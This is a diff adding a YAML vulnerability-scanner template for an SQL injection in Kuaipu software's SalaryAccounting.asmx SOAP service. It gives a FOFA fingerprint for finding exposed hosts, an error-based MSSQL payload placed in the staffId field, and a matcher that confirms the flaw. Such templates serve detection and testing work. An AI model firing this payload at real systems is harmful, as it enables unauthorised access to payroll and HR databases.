@@ -1,0 +1,67 @@
+id: poc-yaml-kuaipu-salaryaccounting-ashx-sqli
+info:
+  name: 快普软件 SalaryAccounting.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 快普软件
+  fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WebService/HR/Salary/SalaryAccounting.asmx
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+    SOAPAction: http://tempuri.org/Calculate
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:tem="http://tempuri.org/">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <tem:Calculate>
+
+    <!--type: string-->
+
+    <tem:SalaryCategory></tem:SalaryCategory>
+
+    <!--type: string-->
+
+    <tem:StaffBirthDay></tem:StaffBirthDay>
+
+    <!--type: string-->
+
+    <tem:staffId>
+
+    1) and 1=sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))--+</tem:staffId>
+
+    <!--type: string-->
+
+    <tem:Department></tem:Department>
+
+    <!--type: string-->
+
+    <tem:SubOrg></tem:SubOrg>
+
+    <!--type: string-->
+
+    <tem:taxMonthly></tem:taxMonthly>
+
+    </tem:Calculate>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>'
+  expression: 'status_code == 500 &&
+
+    contains(body,"在将 nvarchar 值") &&
+
+    contains(body,t2) &&
+
+    contains(content_type,"text/xml")
+
+    '
+transport: http
